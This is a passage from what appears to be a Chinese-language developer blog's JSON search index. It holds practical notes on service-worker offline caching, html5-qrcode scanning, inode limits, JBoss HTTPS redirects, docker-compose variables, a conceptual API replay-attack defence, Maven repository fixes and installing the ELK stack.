MC部落](https://hu.mc4.us/post/change-timezone-in-docker/)","tags":["docker"],"categories":["Docker"]},{"title":"html5 離線網頁方法","url":"%2Fblog%2F2021%2F06%2F02%2Fhtml5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95%2F","content":"\n最近寫個小APP\n想說沒網路也能用\n沒想到也是一個大學問\n\n<!--more-->\n\n## 舊的使用方法(以廢棄)\n\n建議不用使用[Using the application cache - HTML: HyperText Markup Language | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache)\n以廢棄\n\n使用參考\n\n[[HTML5試試看-25] 離線程式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10058385)\n\n\n[有趣的HTML5：离线存储 - SegmentFault 思否](https://segmentfault.com/a/1190000000732617)\n\n\n## sw\n\n[service worker 实现离线缓存](https://mp.weixin.qq.com/s/aboA9dtCK6t0fzs0JU58Iw)\n\n[PWA-3小时带你实现渐进式WebAPP_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili](https://www.bilibili.com/video/BV1wt411E7QD?p=10)\n\n\n[使用Service worker實現加速/離線訪問靜態blog網站_谷歌開發者 - 微文庫](https://www.gushiciku.cn/dc_tw/108051214)\n\n### 實作\n\nhttps://developers.google.com/web/fundamentals/codelabs/offline?hl=zh-tw\n參照裡面做法\n1. index.html\n```htmlembedded=\n<script>\nif('serviceWorker' in navigator) {\n  navigator.serviceWorker\n           .register('/sw.js')\n           .then(function() { console.log(\"Service Worker Registered\"); });\n}\n</script>\n\n```\n\n2. sw.js\n\n```javascript=\nself.addEventListener('install', function(e) {\n    console.log('[Service Worker] Install');\n});\n\nvar cacheName = 'js13kPWA-v2';\nvar appShellFiles = [\n    '/',\n    'index.html',\n    'https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.0.1/html5-qrcode.min.js'\n];\n\nvar contentToCache = appShellFiles;\n\nself.addEventListener('install', function(e) {\n    console.log('[Service Worker] Install');\n    e.waitUntil(\n      caches.open(cacheName).then(function(cache) {\n            console.log('[Service Worker] Caching all: app shell and content');\n        return cache.addAll(contentToCache);\n      })\n    );\n  });\n\n  self.addEventListener('activate', event => {\n    event.waitUntil(self.clients.claim());\n  });\n  \n  self.addEventListener('fetch', event => {\n    event.respondWith(\n      caches.open(cacheName)\n        .then(cache => cache.match(event.request, {ignoreSearch: true}))\n        .then(response => {\n        return response || fetch(event.request);\n      })\n    );\n  });\n```\n\n就順利成功\n\n有空再深入研究","tags":["html5"],"categories":["HTML5"]},{"title":"html5-qrcode 簡單研究","url":"%2Fblog%2F2021%2F06%2F02%2Fhtml5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6%2F","content":"\n最近[疾管家](https://cdc-web.deepq.app/vsafe/scanner?liffId=1655719655-jmaeX5gA)\nQRCOD掃描功能出來\n公司叫我查看怎麼做出這個案例\n簡單看了一下\n[1922 簡訊實聯制 - HackMD](https://g0v.hackmd.io/@au/HkmyoS-Fu)\n\n<!--more-->\n\n\n竟然是 html5-qrcode\n想看他的原始碼，~~竟然找不到~~\n後來看原始碼，有看到map設定\n\n突然想到這個好像能看原始碼\n[保哥 - 前端工程師不可不知的 Source Maps 應用技巧](https://www.facebook.com/will.fans/videos/1834092806619855)\n\n### html5-qrcode 簡單探討\n\n取得相機功能\n預防以後API會變\n這邊主要連結到官方文件\n\n另外，需要`https`協定才能開攝像頭\n\n假如你有架設traefik+docker\n可以用以下指令快速建制\n\n```bash=\ndocker run -d --rm  --name my-apache-app  -v \"$PWD\":/usr/local/apache2/htdocs/     -l  \"traefik.http.routers.testweb.rule=Host(\\`testweb.xxxx.duckdns.org\\`)\"  -l \"traefik.http.routers.testweb.tls=true\"  --net traefik_network  httpd:2.4\n\n```\n\n\n#### 抓取設備\n\n\n[GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader](https://github.com/mebjas/html5-qrcode#pro-mode---if-you-want-to-implement-your-own-user-interface)\n\ndevice id 最後一個，為後鏡頭\n後來發現，不需要這樣抓後鏡頭\n\n#### 設定後鏡頭\n\n```javascript=\n\n// If you want to prefer back camera\nhtml5QrCode.start({ facingMode: \"environment\" }, config, qrCodeSuccessCallback);\n```\n\n[GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader](https://github.com/mebjas/html5-qrcode#pro-mode---if-you-want-to-implement-your-own-user-interface)\n\n#### 開始掃qrcode\n\n```javascript=\nconst html5QrCode = new Html5Qrcode(/* element id */ \"reader\");\nhtml5QrCode.start(\n  cameraId, \n  {\n    fps: 10,    // Optional frame per seconds for qr code scanning\n    qrbox: 250  // Optional if you want bounded box UI\n  },\n  qrCodeMessage => {\n    // do something when code is read\n  },\n  errorMessage => {\n    // parse error, ignore it.\n  })\n.catch(err => {\n  // Start failed, handle it.\n});\n\n```\n\n#### 暫停掃 qrcode\n\n[GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader](https://github.com/mebjas/html5-qrcode#stop-scanning)\n\n```javascript=\nhtml5QrCode.stop().then(ignore => {\n  // QR Code scanning is stopped.\n}).catch(err => {\n  // Stop failed, handle it.\n});\n\n```\n\n#### 地雷(記得掃到馬上停掉)\n\n記得掃到馬上停掉!!\n記得掃到馬上停掉!!\n記得掃到馬上停掉!!\n\n因為掃到，持續會callback 開簡訊\n會悲劇....\n\n掃到，stopcamera 就比較不會出問題\n\n\n\n### js 轉簡訊\n\n這邊有個大地雷 qrcode 轉 sms 程式\nAndroid 竟然不能轉\n但是IOS可以\n\n這邊就是使用\n```javascript \n    if (isAndroid()) {\n        location.href = \"sms:1922?body=00000000\"\n    } else {\n        // iOS\n        location.href = \"sms:1922&body=00000000\"\n    }\n\n```\nAndroid用超連結就可順利執行\n\n為什麼liff Android 可以直接轉的?目前猜測是line app可以這樣做\n把疾管家用到 Chrome 就不能使用\n這邊就不深入了\n\n\n####  網路範例\n[bradorego.com/test/sms.html](https://bradorego.com/test/sms.html)\n\n```htmlembedded=\n\t<p>\n\t\t\t<a href=\"sms:5552345678\">Phone only</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:+15552345678\">Phone(+1) only</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:?body=Hello,%20world\">Body only</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:;body=Hello,%20world\">;body only</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:5552345678?body=Hello%20World\">Phone and ?body</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:+15552345678?body=Hello%20World\">Phone(+1) and ?body</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms:5552345678;body=Hello%20World\">Phone(+1) and ;body</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://5552345678\">Phone only (sms://)</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://+15552345678\">Phone(+1) only (sms://)</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://5552345678?body=Hello,%20World\">Phone and ?body (sms://)</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://+15552345678?body=Hello,%20World\">Phone(+1) and ?body (sms://)</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://5552345678;body=Hello,%20World\">Phone and ;body (sms://)</a>\n\t\t</p>\n\t\t<p>\n\t\t\t<a href=\"sms://+15552345678;body=Hello,%20World\">Phone(+1) and ;body (sms://)</a>\n\t\t</p>\n```\n### SMSTO\n\n這邊有個地雷，SMSTO 小米手機不能轉\n可以用Google 智慧鏡頭 解決\n\nQRCODE \n\n正常手機掃條碼就能自動轉\n\n\n## 彩蛋\n\n[vite2: Make Web Dev Fast Again & Again. – Dropbox Paper](https://paper.dropbox.com/doc/vite2-Make-Web-Dev-Fast-Again-Again.-9DcJOLb0spaYNbCbF6Zqd)\n\n[ES6,7,8,9,10,11中，用一次就上[GitHub - kurotanshi/hex-vite-demo: 2021 大神來六角 demo code](https://github.com/kurotanshi/hex-vite-demo)癮的語法 – Dropbox Paper](https://paper.dropbox.com/doc/ES67891011-oUCvWdcmTSKsiuGzbTjZC)\n\n\n","tags":["qrcode"],"categories":["JavaScript"]},{"title":"系統上檔案數量限制","url":"%2Fblog%2F2021%2F06%2F02%2F%E7%B3%BB%E7%B5%B1%E4%B8%8A%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%E9%99%90%E5%88%B6%2F","content":"\ninode 有限制檔案數量\n刪除沒用到的檔案\n<!--more-->\n\n**2021-06-14**\n後來有找到 XFS 會造成空間已滿問題\n[XFS 程式出現 no space left on device | 程式狂想筆記](https://malagege.github.io/blog/2021/06/14/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/)\n大家可以確認看看\n\n[檔案數量限制 · Linux學習筆記](https://a42033.gitbooks.io/linux-/content/linux/information/file_number.html)\n\n```python=\n#python2\nfor x in xrange(0,1000000000):\n  f=open(str(x),'a')\n  f.close()\n```\n\n64000 看起來是指子資料夾限制\n\n> It depends on the file system. ext3 suppport ~32000 subdirectories (not files!) in a given directory, with ext4 it's 64000 by default. xfs has no limit to my knowledge.\n\n[linux - Is there a hard limit to the number of files a directory can have? - Server Fault](https://serverfault.com/questions/506465/is-there-a-hard-limit-to-the-number-of-files-a-directory-can-have)\n\n[Linux实例磁盘空间满和inode满的问题排查方法 - 阿里云](https://help.aliyun.com/knowledge_detail/42531.html)\n\n\n[【程式】Shell Script : 顯示某資料匣下的 inode 數量 (檔案數) @ My Life :: 隨意窩 Xuite日誌](https://blog.xuite.net/chingwei/blog/32921084)\n\n[Linux 快速清除「檔案數量太多」的速度比較 – Tsung's Blog](https://blog.longwin.com.tw/2016/12/linux-delete-many-files-quick-2016/)\n\n\n[inode 用光光了 | 老洪的 IT 學習系統](https://snippetinfo.net/media/2528)\n\n\n\n[[問題] XFS檔案系統，刪除檔案沒有釋放空間。 - 看板Linux | PTT數位生活區](https://pttdigits.com/Linux/1GMMS1Dz)\n\nhttps://www.cnblogs.com/diantong/p/10512696.html\n\n[Linux下使用xfs時提示沒有磁盤空間的情況該如何處理_Linux維護](http://www.unixlinux.online/unixlinux/linuxgl/linuxwh/201703/74599.html)\n\n\n[lostwa.com - 一次 XFS 文件系统碎片导致的空间异常](https://lostwa.com/2020/troubleshoting_the_missing_disk_space.html)\n\n[Linux磁盘空间怎么释放？ - 知乎](https://zhuanlan.zhihu.com/p/172107061)","tags":["linux"],"categories":["Linux"]},{"title":"Jboss 設定 http 導 https","url":"%2Fblog%2F2021%2F06%2F02%2FJboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https%2F","content":"\n\n<!--more-->\n\n## redirect\n\nhttps://stackoverflow.com/a/43948374\n\n\n我有測試上面網站方式，本機測試可以http導向https\n我這邊standalone.xml 剛好預設有那些https設定，所以沒調整\nproject /WebContent/WEB-INF/web.xml 也需要加\n\n\n```xml\n<security-constraint>\n    <web-resource-collection>\n        <web-resource-name>WEB_APPLICATION_NAME</web-resource-name>\n        <url-pattern>/*</url-pattern>\n    </web-resource-collection>\n    <user-data-constraint>\n        <transport-guarantee>CONFIDENTIAL</transport-guarantee>\n    </user-data-constraint>\n</security-constraint>\n```\n參考:https://www.cnblogs.com/maximo/p/5775627.html\n\n\n\n## rewrite \nstandalone.xml\n```xml\n        <subsystem xmlns=\"urn:jboss:domain:transactions:4.0\">\n            <core-environment>\n                <process-id>\n                    <uuid/>\n               </process-id>\n            </core-environment>\n            <recovery-environment socket-binding=\"txn-recovery-environment\" status-socket-binding=\"txn-status-manager\"/>\n            <object-store path=\"tx-object-store\" relative-to=\"jboss.server.data.dir\"/>\n        </subsystem>\n        <subsystem xmlns=\"urn:jboss:domain:undertow:4.0\">\n            <buffer-cache name=\"default\"/>\n            <server name=\"default-server\">\n                <http-listener name=\"default\" socket-binding=\"http\" redirect-socket=\"https\" enable-http2=\"true\"/>\n                <https-listener name=\"https\" socket-binding=\"https\" security-realm=\"ApplicationRealm\" enable-http2=\"true\"/>\n                <host name=\"default-host\" alias=\"localhost\">\n                    <location name=\"/\" handler=\"welcome-content\"/>\n                    <filter-ref name=\"server-header\"/>\n                    <filter-ref name=\"x-powered-by-header\"/>\n                    <http-invoker security-realm=\"ApplicationRealm\"/>\n                    <filter-ref name=\"http-to-https\" predicate=\"equals(%p,8080)\"/>\n                </host>\n            </server>\n            <servlet-container name=\"default\">\n                <jsp-config development=\"true\"/>\n                <websockets/>\n            </servlet-container>\n            <handlers>\n                <file name=\"welcome-content\" path=\"${jboss.home.dir}/welcome-content\"/>\n            </handlers>\n            <filters>\n                <response-header name=\"server-header\" header-name=\"Server\" header-value=\"JBoss-EAP/7\"/>\n                <response-header name=\"x-powered-by-header\" header-name=\"X-Powered-By\" header-value=\"Undertow/1\"/>\n                <rewrite name=\"http-to-https\" redirect=\"true\" target=\"https://%h:8443%U\"/>\n            </filters>\n        </subsystem>\n```\n","tags":["https"],"categories":["JBoss"]},{"title":"docker-compose 的環境變數設定","url":"%2Fblog%2F2021%2F06%2F02%2Fdocker-compose-%E7%9A%84%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A%2F","content":"\n[Docker Compose 引用环境变量 - sparkdev - 博客园](https://www.cnblogs.com/sparkdev/p/9826520.html)\n\n之前用 docker-compose 都不知道可以抓環境變數\n甚至 .env 也可以抓到\n某天看到這個方法\n今天來整理一下，不確定是哪個版本才有這個功能\n\n<!--more-->\n\n## Bash 環境變數\n\n```bash=\nexport IMAGETAG=httpd\n```\n\nwindows posershell 不知道要怎麼抓\n但先不研究\n\n\n\n```yaml=\nversion: '3'\n\nservices:\n  web:\n    image: ${IMAGETAG}\n    ports:\n     - \"80:80\"\n  redis:\n    image: \"redis:alpine\"\n\n\n```\n\n\n### 預設環境變數\n\n重新開新的bash\n\n```yaml=\nversion: '3'\nservices:\n  web:\n    image: ${IMAGETAG:-nginx}\n    ports:\n     - \"80:80\"\n  redis:\n    image: \"redis:alpine\"\n```\n\n\n### 環境變數傳給容器\n\n```yaml=\nweb:\n  environment:\n    DEBUG: 1\n```\n同等於 \n docker run -e DEBUG=1 ubuntu bash\n\n\n```bash=\ndocker run -e DEBUG=1 ubuntu bash\n\necho $DEBUG\n#1\n```\n\n沒有設定 1 會為 null\n請參考如下\n\n```yaml=\nweb:\n  environment:\n    DEBUG: \n```\n![](https://i.imgur.com/oFP350e.png)\n\n再 Linux 設定 DEBUG 環境變數為 1\n\n\n![](https://i.imgur.com/vNoQqee.png)\n\n##  .env\n\n參考: [Environment variables in Compose | Docker Documentation](https://docs.docker.com/compose/environment-variables/)\n```\n$ cat .env\nTAG=v1.5\n\n$ cat docker-compose.yml\nversion: '3'\nservices:\n  web:\n    image: \"webapp:${TAG}\"\n$ docker-compose config\n\nversion: '3'\nservices:\n  web:\n    image: 'webapp:v1.5'\n```\n\n\n\n## 設定檔案為容器多個環境變數\n\n```\n$ cat .env\nTAG=v1.5\n\n$ cat ./config/.env.dev\nTAG=v1.6\n\n\n$ cat docker-compose.yml\nversion: '3'\nservices:\n  web:\n    image: \"webapp:${TAG}\"\n\n\n$ docker-compose config \nversion: '3'\nservices:\n  web:\n    image: 'webapp:v1.5'\n    \n$ docker-compose --env-file ./config/.env.dev config \nversion: '3'\nservices:\n  web:\n    image: 'webapp:v1.6'\n```\n\n最下面同等於 \n\n```bash\ndocker run --env-file=./config/.env.dev\n```\n\n\n## 環境變數使用順序\n\n\n1. Compose file\n2. Shell environment variables\n3. Environment file\n4. Dockerfile\n5. Variable is not defined\n\n\n\n> 首先，在 docker-compose.yml 文件中直接設置的值優先級是最高的。\n然後是在當前 shell 中 export 的環境變量值。\n接下來是在環境變量文件中定義的值。\n再接下來是在 Dockerfile 中定義的值。\n最後還沒有找到相關的環境變量就認為該環境變量沒有被定義。\n\n\n## 依照環境變數建置測試/正式環境\n\n參考: [Docker Compose 引用環境變量 - sparkdev - 博客園](https://www.cnblogs.com/sparkdev/p/9826520.html)\n\ntest.sh\n```shell=\n#!/bin/bash\n# define env var default value.\nexport IMAGETAG=web:v1\nexport APPNAME=HelloWorld\nexport AUTHOR=Nick Li\nexport VERSION=1.0\n```\n\nprod.sh\n```shell=\n#!/bin/bash\n# define env var default value.\nexport IMAGETAG=webpord:v1\nexport APPNAME=HelloWorldProd\nexport AUTHOR=Nick Li\nexport VERSION=1.0LTS\n```\n\n可依照 shell 環境變數建立不同環境\n還算滿方便的方法\n\n```shell=\n source test.sh\n$ docker-compose config\n\n\n$ source prod.sh\n$ docker-compose config\n```","tags":["docker"],"categories":["Docker"]},{"title":"SQL: UPDATE ... SET ... FROM 用法","url":"%2Fblog%2F2021%2F06%2F02%2FSQL-UPDATE-SET-FROM-%E7%94%A8%E6%B3%95%2F","content":"\n最近看到 PostgresSQL 看到 Update ... set ... from ...\n看到怎麼會有 from  用再 Update\n\n<!--more-->\n\n後來看了一下\n[sql update set from 的用法 (轉) - IT閱讀](https://www.itread01.com/content/1499088123.html)\n\n原來是 join 表\n\n後來發現 MySQL 不能用這個寫法\n但我印象中有用過\n\n[SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/16/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/)\n[mysql 可不可以使用 update from 这样语句啊 -CSDN论坛](https://bbs.csdn.net/topics/270012894)","tags":["sql"],"categories":["SQL"]},{"title":"API 防重放小記(replay attack)","url":"%2Fblog%2F2021%2F06%2F02%2FAPI-%E9%98%B2%E9%87%8D%E6%94%BE%E5%B0%8F%E8%A8%98-replay-attack%2F","content":"\n最近思考怎麼預防尾造 API 回傳內容，剛好看到這幾篇文章\n順便整理一下\n\n<!--more-->\n\n* [数据安全（反爬虫）之「防重放」策略 - SegmentFault 思否](https://segmentfault.com/a/1190000021922705)\n* [网络安全问题-防篡改、防劫持、防重放_越学越菜的博客-CSDN博客](https://blog.csdn.net/qq_43323585/article/details/106088470)\n* [开放平台API接口安全策略汇总 - 简书](https://www.jianshu.com/p/6105b06aa208)\n* [Spring Boot接口如何设计防篡改、防重放攻击 – 前端开发，JQUERY特效，全栈开发，vue开发](https://www.jqhtml.com/49154.html)\n\n\n\n簡單來說就是要做 sign 簽章，兩邊用一樣私鑰把內容加密(做簽章)，資料傳到Server 再把私私鑰做簽章，看sign傳過來的值有沒有一樣\n\n這時候我有想到兩邊問題，私鑰被知道不就無解，任何人不就能使用\n這邊防禦是以中間人為考量，並非討論App是否被破解取得私鑰\n也有想過用公鑰、私鑰做一次加密解密，還時會被APP解析破解取得加密密碼\n\n這時候加入 token 能有效杜絕這個問題(不是開放API的話)\napi Token 是無狀態，自然可以解決上面問題\n[session/token (http是无状态协议) - 簡書](https://www.jianshu.com/p/27317bd226fe)","tags":["attack"],"categories":["程式心法"]},{"title":"在日誌中顯示Spring事務","url":"%2Fblog%2F2021%2F06%2F02%2F%E5%9C%A8%E6%97%A5%E8%AA%8C%E4%B8%AD%E9%A1%AF%E7%A4%BASpring%E4%BA%8B%E5%8B%99%2F","content":"\n每次都要找很久，所以特別記錄\n\n<!--more-->\n```\nlog4j.logger.org.springframework.transaction.interceptor = trace\n```\n\n\nhttps://www.itranslater.com/qa/details/2127334888293532672","tags":["spring"],"categories":["Java"]},{"title":"Eclipse 處理 Maven 問題","url":"%2Fblog%2F2021%2F06%2F02%2FEclipse-%E8%99%95%E7%90%86-Maven-%E5%95%8F%E9%A1%8C%2F","content":"\n各種奇怪整裡\n\n<!--more-->\n\n\n## Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1\n\n```\n[INFO] Scanning for projects...\n[WARNING] \n[WARNING] Some problems were encountered while building the effective model for wsclient:wsclient:jar:0.0.1-SNAPSHOT\n[WARNING] 'build.plugins.plugin.version' for org.apache.maven.plugins:maven-resources-plugin is missing. @ line 60, column 21\n[WARNING] 'build.plugins.plugin.version' for org.apache.maven.plugins:maven-compiler-plugin is missing. @ line 52, column 21\n[WARNING] \n[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.\n[WARNING] \n[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.\n[WARNING] \n[INFO] \n[INFO] Using the builder org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder with a thread count of 1\n[INFO]                                                                         \n[INFO] ------------------------------------------------------------------------\n[INFO] Building finvcbusclient Maven Webapp 0.0.1-SNAPSHOT\n[INFO] ------------------------------------------------------------------------\n[INFO] Downloading: http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom\n[INFO] ------------------------------------------------------------------------\n```\n\n發現 `http://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/2.6/maven-resources-plugin-2.6.pom` 不能下載\n加https 就可以了...\n\n後來網路嘗試了各種方法(以下我沒成功，可能是不同狀況)\n* [Failure to transfer org.apache.maven.plugins:maven-compiler-plugin:jar:2.5.1_weixin_30580341的博客-CSDN博客](https://blog.csdn.net/weixin_30580341/article/details/99592631)\n* [eclipse加载maven工程提示pom.xml无法解析org.apache.maven.plugins:maven-resources-plugin:2.4.3解决方案_imlmy的专栏-CSDN博客](https://blog.csdn.net/imlmy/article/details/8268293)\n* [eclipse建立maven錯誤訊息Could not calculate build plan: Plugin org.apache.maven.plugins:maven-war-plugin:2. | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2019/09/17/192207)\n\n都沒有成功....\n\n後來發現是 \n\n```xml=\n <url>http://people.apache.org/repo/m2-incubating-repository/</url> \n```\n\n不能訪問\n\n```\n  <url>https://repo.maven.apache.org/maven2/</url> \n```\n\n修正完還是不行...\n\n\n最後加了這個就正常了\n[java - How to solve maven 2.6 resource plugin dependency? - Stack Overflow](https://stackoverflow.com/questions/31316339/how-to-solve-maven-2-6-resource-plugin-dependency/59872184#59872184)\n\n```xml pom.xml\n<repositories>\n        <repository>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>central</id>\n            <name>Central Repository</name>\n            <url>https://repo.maven.apache.org/maven2</url>\n        </repository>\n    </repositories>\n    <pluginRepositories>\n        <pluginRepository>\n            <releases>\n                <updatePolicy>never</updatePolicy>\n            </releases>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>central</id>\n            <name>Central Repository</name>\n            <url>https://repo.maven.apache.org/maven2</url>\n        </pluginRepository>\n    </pluginRepositories>\n```","tags":["maven"],"categories":["Java"]},{"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","url":"%2Fblog%2F2021%2F05%2F02%2F%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n\n# 安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗\n\n本文章參考: [Elastic stack（安裝篇) - HackMD](https://hackmd.io/@QCZ_Kvv1ScixyAPzRYDKWQ/ry2Inu5HE?type=view)\n大量操作參照如上\n\n<!--more-->\n\n## 安裝 Elasticsearch\n\n官方說明的安裝步驟:\n[Download Elasticsearch Free • Get Started Now | Elastic](https://www.elastic.co/downloads/elasticsearch-no-jdk)\n1. Download and install one of the supported JDKs for Elasticsearch\n2. Download and unzip Elasticsearch\n3. Run bin/elasticsearch (or bin\\elasticsearch.bat on Windows)\n4. Run curl http://localhost:9200/ or Invoke-RestMethod http://localhost:9200 with PowerShell\n\n我這邊用 VM 來安裝 ubuntu 還境\n\n[Vagrant box ubuntu/focal64 - Vagrant Cloud](https://app.vagrantup.com/ubuntu/boxes/focal64)\n```bash=\nvagrant init ubuntu/focal64\nvagrant up\n```\n可能會遇到這個問題\n[vagrant 啟動無法自動掛載解決方法 | 程式狂想筆記](https://malagege.github.io/blog/2020/06/26/vagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/)\n\nvagrant 建議 RAM 調成 3GB\n\nVM 設一個可以連的IP\n\n![](https://i.imgur.com/5XQeiq0.png)\n\n\n### 安裝 JDK (這部分請跳過)\n\n因為我安裝 ElasticSearch 遇到could not find java; set JAVA_HOME or ensure java is in PATH\n好像是 deb 安裝才會遇到這個問題\n設定 JAVA_HOME 還是無法解決\n\n[Elastic Support Matrix | Elasticsearch](https://www.elastic.co/support/matrix#matrix_jvm)\n我選 Elasticsearch 7.12.x \nJDK 對應版本選 11\n\n```bash=\nsudo apt-get install openjdk-11-jdk\n\n# 確認版本\njava --version\n# openjdk 11.0.11 2021-04-20\n# OpenJDK Runtime Environment (build 11.0.11+9-Ubuntu-0ubuntu2.20.04)\n# OpenJDK 64-Bit Server VM (build 11.0.11+9-Ubuntu-0ubuntu2.20.04, mixed mode, sharing)\n```\n\n設定 JAVA_HOME\n\n[java - How to set JAVA_HOME in Linux for all users - Stack Overflow](https://stackoverflow.com/questions/24641536/how-to-set-java-home-in-linux-for-all-users)\n\n```bash= /etc/profile\n# 請查看對印自己Java路徑做調整\nJAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64\nES_JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64\n```\n\n### 安裝 Elasticsearch\n\n\n[Download Elasticsearch Free • Get Started Now | Elastic](https://www.elastic.co/downloads/elasticsearch-no-jdk)\n選對應版本\n\n[Install Elasticsearch with Debian Package | Elasticsearch Guide [7.12] | Elastic](https://www.elastic.co/guide/en/elasticsearch/reference/7.12/deb.html#deb-repo)\n```bash=\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb.sha512\nshasum -a 512 -c elasticsearch-7.12.1-amd64.deb.sha512 \nsudo dpkg -i elasticsearch-7.12.1-amd64.deb\n```\n\n#### 安裝翻車排除\n![](https://i.imgur.com/l1KX7wU.png)\n\n[elasticsearch之JAVA环境变量报错：could not find java; set JAVA_HOME or ensure java is in PATH - 峰哥ge - 博客园](https://www.cnblogs.com/FengGeBlog/p/10266126.html)\n\n設定JAVA_HOME 安裝也沒用\n上面 deb 是函JAVA的\n目前推估 安裝 deb 才會遇到這個問題\n\n單純抓zip應該可以設定 JAVA_HOME 解決\n\n### 啟動 ElasticSearch\n\n```\nsudo service elasticsearch start\n```\n\n確認是否成功\n\n```bash=\ncurl http://localhost:9200/\n# {\n#   \"name\" : \"ubuntu-focal\",\n#   \"cluster_name\" : \"elasticsearch\",\n#   \"cluster_uuid\" : \"AjrnvASjSG6aWrJIFhzSYg\",\n#   \"version\" : {\n#     \"number\" : \"7.12.1\",\n#     \"build_flavor\" : \"default\",\n#     \"build_type\" : \"deb\",\n#     \"build_hash\" : \"3186837139b9c6b6d23c3200870651f10d3343b7\",\n#     \"build_date\" : \"2021-04-20T20:56:39.040728659Z\",\n#     \"build_snapshot\" : false,\n#     \"lucene_version\" : \"8.8.0\",\n#     \"minimum_wire_compatibility_version\" : \"6.8.0\",\n#     \"minimum_index_compatibility_version\" : \"6.0.0-beta1\"\n#   },\n#   \"tagline\" : \"You Know, for Search\"\n# }\n```\n\n## 設定 ElasticSearch\n\n預設是 localhost 連線\n要外連預需要設定\n\n/etc/elasticsearch/elasticsearch.yml\n\n```yaml=\n# By default Elasticsearch is only accessible on localhost. Set a different\n# address here to expose this node on the network:\n#\n#network.host: 192.168.0.1\n#\n# By default Elasticsearch listens for HTTP traffic on the first free port it\n# finds starting at 9200. Set a specific HTTP port here:\n#\n#http.port: 9200\n```\n\n## 安裝 Kinbana\n\n\n[Install Kibana with Debian package | Kibana Guide [7.12] | Elastic](https://www.elastic.co/guide/en/kibana/7.12/deb.html#install-deb)\n```bash=\nwget https://artifacts.elastic.co/downloads/kibana/kibana-7.12.1-amd64.deb\nshasum -a 512 kibana-7.12.1-amd64.deb \nsudo dpkg -i kibana-7.12.1-amd64.deb\n```\n\n\n### 設定 kibana\n\n設定對外 IP\n\n補充: 這邊 Vagrant 要設定 VM 對外 IP\n![](https://i.imgur.com/MH2wTZ9.png)\n\n要把 kibana 設定這個 IP\n\n![](https://i.imgur.com/w9NM5hV.png)\n\n#### Kibana server is not ready yet\n\n1. 確認本機 ElasticSearch 是否啟動\n2. 確認 kibana.yml 裡面 ElasticSearch 設定是否正確(預設為localhost:9200)\n3. [Kibana server is not ready yet出现的原因_FV8023的博客-CSDN博客](https://blog.csdn.net/FV8023/article/details/96427702)\n\n我後來發現 ElasticSearch 重啟的時候\n沒辦法啟動，後來 RAM 調大(2GB)就正常了\n\n\n## logstash \n\n### 安裝 logstash\n\n\n```bash=\nwget https://artifacts.elastic.co/downloads/logstash/logstash-7.12.1-amd64.deb\nsudo apt install ./logstash-7.12.1-amd64.deb \n```\n\n安裝時候當機，所以RAM調成 3GB\n可見這個真的很吃記憶體\n\n### Hello World\n\n```\n/usr/share/logstash/bin/logstash -e 'input { stdin { } } output { stdout {} }'\n```\n\n我這邊沒看到 Hello World\n基本上就是有問題\n\n\n### 翻車時間\n\n```\nUsing bundled JDK: /usr/share/logstash/jdk\nOpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release.\n```\n\n[Hello World 系列 - Logstash](https://tomme.me/hello-world-series-logstash/)\n\n後來發現不是翻車，是執行 logstash 需要一段時間(VM效能不好)\n跑了一下，我看`htop` 